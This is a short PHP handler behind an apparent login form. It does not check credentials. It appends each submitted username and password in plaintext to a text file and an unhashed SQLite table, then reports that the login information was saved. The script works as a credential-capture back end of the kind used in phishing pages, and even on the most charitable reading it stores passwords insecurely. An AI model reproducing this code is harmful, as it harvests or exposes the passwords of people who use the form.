
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST["username"]);
    $password = htmlspecialchars($_POST["password"]);

    // Save to file
    $file = fopen("users.txt", "a");
    fwrite($file, "Username: $username | Password: $password\n");
    fclose($file);

    // Save to SQLite
    $db = new PDO("sqlite:users.db");
    $db->exec("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)");
    $stmt = $db->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
    $stmt->execute([$username, $password]);

    echo "<h2>Login information saved successfully!</h2>";
    echo "<a href='index.html'>Back to Login</a>";
}
?>
